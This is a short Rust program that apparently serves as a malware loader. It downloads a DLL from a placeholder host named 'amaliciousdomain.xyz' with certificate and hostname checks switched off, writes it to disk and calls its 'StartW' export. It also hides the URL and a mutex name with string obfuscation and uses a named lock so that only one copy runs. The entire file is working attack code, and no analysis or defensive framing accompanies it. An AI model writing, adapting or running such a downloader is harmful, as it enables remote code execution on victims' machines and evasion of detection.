use std::process::exit;

//common use
use bytes::Bytes;
use region::{Protection, Allocation};
use named_lock::NamedLock;
use named_lock::Result;
use std::fs::File;
use std::io::prelude::*;

const URL: &str = "http://grape.amaliciousdomain.xyz:8000/LONG_FIR.dll";

const LOCKNAME: &str = "3rBoOnIoREnE";


fn getscode(url: &str) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    return rbytes;
}

fn writefile(rbytes: bytes::Bytes) {
    let mut file = File::create("foo.dll").unwrap();
    file.write_all(&rbytes);
}

fn dne() -> Result<(), region::Error> {
    //download the payload
    let rbytes = getscode(obfstr::obfstr!(URL));
    writefile(rbytes);
    unsafe {
        let lib = libloading::Library::new("foo.dll").unwrap();
        let func: libloading::Symbol<unsafe extern fn() -> u32> = lib.get(b"StartW").unwrap();
        func();
    }
    Ok(())
}

fn main() {
    let lock = match NamedLock::create(obfstr::obfstr!(LOCKNAME)) {
        Ok(lock) => lock,
        Err(_) => exit(0)
    };
    let _guard = match lock.lock() {
        Ok(g) => g,
        Err(_) => exit(0)
    };
    let _ = dne();
}
